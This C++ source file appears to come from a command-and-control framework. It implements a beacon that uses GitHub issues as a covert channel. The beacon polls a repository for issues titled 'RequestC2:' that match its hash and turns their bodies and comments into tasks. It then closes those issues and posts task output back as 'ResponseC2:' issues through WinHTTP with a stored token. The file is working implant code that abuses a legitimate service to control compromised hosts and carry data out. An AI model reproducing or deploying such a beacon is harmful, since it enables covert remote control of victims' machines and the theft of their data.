#include "BeaconGithub.hpp"


#ifdef __linux__

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "httplib.h"

#elif _WIN32

#include <WinHttp.h>
#pragma comment(lib, "winhttp.lib")

#endif


using namespace std;
using json = nlohmann::json;


#ifdef __linux__

using namespace httplib;

#elif _WIN32

std::wstring getUtf16(const std::string& str, int codepage)
{
    if (str.empty()) 
        return std::wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}


int BeaconGithub::GithubPost(const string& domain, const string& url, const string& data, string &response)
{
    bool isHttps = true;
    wstring sdomain = getUtf16(domain, CP_UTF8);
    wstring surl = getUtf16(url, CP_UTF8);

    DWORD dwSize = 0;
    
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, sdomain.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);

    // Create an HTTP request handle.
    DWORD dwFlags = 0;
    if(isHttps)
        dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"POST", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);

    // Add a request header.
    if( hRequest )
    {
        std::string auth = "token ";
        auth+=m_token;

        json httpHeaders = {
            { "Accept", "application/vnd.github+json" },
			{ "Authorization", auth },
			{ "Cookie", "logged_in=no" }
            };

        for (auto& it : httpHeaders.items())
        {
            std::string newHeader = (it).key();
            newHeader+=":";
            newHeader+=(it).value();

            std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());

            bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
        }
    }

    // Post data
    LPSTR pdata = const_cast<char*>(data.c_str());;
    DWORD lenData = data.size();

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pdata, lenData, lenData, 0);

    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwStatusCode = 0;
    dwSize = sizeof(dwStatusCode);

    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);

    // Keep checking for data until there is nothing left.
    response.clear();
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
                // printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
			}

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                // printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                DWORD dwDownloaded = 0;
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				{
                    // printf("Error %u in WinHttpReadData.\n", GetLastError());
				}
                else
                {
                    // printf("%s", pszOutBuffer);
                    response = response + string(pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }

    // std::cout << "dwStatusCode " << std::to_string(dwStatusCode) << std::endl;
    // std::cout << "response " << response << std::endl;

    // Close any open handles.
    if (hRequest) 
        WinHttpCloseHandle(hRequest);
    if (hConnect) 
        WinHttpCloseHandle(hConnect);
    if (hSession) 
        WinHttpCloseHandle(hSession);

    return dwStatusCode;
}


int BeaconGithub::GithubGet(const string& domain, const string& url, string& response)
{
    bool isHttps = true;
    wstring sdomain = getUtf16(domain, CP_UTF8);
    wstring surl = getUtf16(url, CP_UTF8);

    DWORD dwSize = 0;
    
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, sdomain.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);

    // Create an HTTP request handle.
    DWORD dwFlags = 0;
    if(isHttps)
        dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);

    // Add a request header.
    if( hRequest )
    {
        std::string auth = "token ";
        auth+=m_token;

        json httpHeaders = {
            { "Accept", "application/vnd.github+json" },
			{ "Authorization", auth },
			{ "Cookie", "logged_in=no" }
            };

        for (auto& it : httpHeaders.items())
        {
            std::string newHeader = (it).key();
            newHeader+=":";
            newHeader+=(it).value();

            std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());

            bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
        }
    }

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwStatusCode = 0;
    dwSize = sizeof(dwStatusCode);

    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);

    // Keep checking for data until there is nothing left.
    response.clear();
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
                // printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
			}

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                // printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                DWORD dwDownloaded = 0;
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				{
                    // printf("Error %u in WinHttpReadData.\n", GetLastError());
				}
                else
                {
                    // printf("%s", pszOutBuffer);
                    response = response + string(pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }

    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    return dwStatusCode;
}


int BeaconGithub::HandleRequest(const string& domain, const string& url)
{
    string response;
    int statusCode = GithubGet(domain, url, response);
    
    std::cout << "statusCode " << std::to_string(statusCode) << std::endl;
    std::cout << "response " << response.size() << std::endl;

    if(!response.empty() && (statusCode==200 || statusCode==201))
    {
        json jsonIssues = json::parse(response);

        // for every issue in the list
        for (json::iterator it = jsonIssues.begin(); it != jsonIssues.end(); ++it)
        {            
            std::string title = (*it)["title"];
            std::string body = (*it)["body"];
            int nbComments = (*it)["comments"];
            int number = (*it)["number"];

            std::cout << "title " << title << std::endl;
            std::cout << "body " << body.size() << std::endl;
            std::cout << "nbComments " << nbComments << std::endl;

            if(nbComments!=0)
            {
                std::string issueEndpoint = "/repos/";
                issueEndpoint += m_project;	
                issueEndpoint += "/issues/";
                issueEndpoint += std::to_string(number);	
                issueEndpoint += "/comments";

                statusCode = GithubGet(domain, issueEndpoint, response);

                std::cout << "comments statusCode " << std::to_string(statusCode) << std::endl;
                std::cout << "comments response " << response.size() << std::endl;

                json jsonComments = json::parse(response);

                for (json::iterator itc = jsonComments.begin(); itc != jsonComments.end(); ++itc)
                {                   
                    std::string bodyComments = (*itc)["body"];
                    body+=bodyComments;

                    std::cout << "bodyComments " << bodyComments.size() << std::endl;
                    std::cout << "concate " << body.size() << std::endl;
                }
            }

            if(title.rfind("RequestC2: ", 0) == 0)
            {
                std::string marker = "RequestC2: ";
                std::size_t pos = title.find(marker);
                if (pos == std::string::npos) 
                {
                    continue;
                }
                pos += marker.length();
                std::string beaconHash = title.substr(pos);

                if(beaconHash!=m_beaconHash)
                {
                    continue;
                }

                std::cout << "cmdToTasks body " << body.size() << std::endl;

                cmdToTasks(body);

                // close the issue
                std::string issueEndpoint = "/repos/";
                issueEndpoint += m_project;	
                issueEndpoint += "/issues/";
                issueEndpoint += std::to_string(number);	

                // Post data
                json responseData = {{"state", "closed"}};
                std::string finalBody = responseData.dump();

                GithubPost(domain, issueEndpoint, finalBody, response);
            }
        }
    }

    return 0;
}

#endif



BeaconGithub::BeaconGithub(std::string& config, const std::string& project, const std::string& token)
	: Beacon()
    , m_project(project)
    , m_token(token)
{
    m_aliveTimerMs = 1000 * 10;
    srand(time(NULL));

    // beacon and modules config
    initConfig(config);
}


BeaconGithub::~BeaconGithub()
{
}


void BeaconGithub::checkIn()
{
    
#ifdef __linux__

    // TODO
    // std::string url = "https://api.github.com";

    // std::string token = "token ";
    // token+=m_token;

    // httplib::Headers headers = {
    //     { "Accept", "application/vnd.github+json" },
    //     { "Authorization", token },
    //     { "Cookie", "logged_in=no" }
    // };

    // httplib::Client cli(url);

    // std::string endpoint = "/repos/";
    // endpoint += m_project;	
    // endpoint += "/issues";	

    // std::cout << "endpoint " << endpoint << std::endl;

    // // Post response
    // std::string output;
    // taskResultsToCmd(output);

    // if(!output.empty())
    // {
    //     json responseData = {
    //         {"title", "ResponseC2: test"},
    //         {"body", output},
    //         };

    //     std::string data = responseData.dump();
    //     std::string contentType = "application/json";
    //     auto response = cli.Post(endpoint, headers, data, contentType);
    // }

    // // Handle request
    // auto response = cli.Get(endpoint, headers);

    // response->status;
    // response->body;
    // std::cout << "response->body " << response->body << std::endl;

    // if(!response->body.empty())
    // {
    //     json my_json = json::parse(response->body);

    //     // for every issue in the list
    //     for (json::iterator it = my_json.begin(); it != my_json.end(); ++it)
    //     {
    //         std::string json_str = (*it).dump();
    //         auto issue = json::parse(json_str);
            
    //         std::string title = issue["title"];
    //         std::string body = issue["body"];

    //         std::cout << "title " << title << std::endl;
    //         std::cout << "body " << body << std::endl;

    //         if(title.rfind("RequestC2: ", 0) == 0)
    //         {
    //             if(!body.empty())
    //             {
    //                 cmdToTasks(body);
    //             }

    //             std::string number = issue["number"];
    //             std::string issueEndpoint = "/repos/";
    //             issueEndpoint += m_project;	
    //             issueEndpoint += "/issues/";
    //             issueEndpoint += number;	
    //             // auto response = cli.Post(issueEndpoint, headers, data, contentType);
    //         }
    //     }
    // }	


#elif _WIN32

    std::string url = "api.github.com";

    std::string endPoint = "/repos/";
    endPoint += m_project;	
    endPoint += "/issues";	

    std::cout << "endPoint " << endPoint << std::endl;

	std::string output;
	taskResultsToCmd(output);

    // Sent response
    // TODO handle big response with multiple comments
    std::string reponseTitle = "ResponseC2: ";   
    reponseTitle+=m_beaconHash;
    json responseData = {{"title", reponseTitle}, {"body", output}};
    std::string finalBody = responseData.dump();
    string response;
    std::cout << "GithubPost "  << std::endl;

    GithubPost(url, endPoint, finalBody, response);

    // Handle Request
    std::cout << "HandleRequest "  << std::endl;

    HandleRequest(url, endPoint);

    std::cout << "end "  << std::endl;


#endif


}
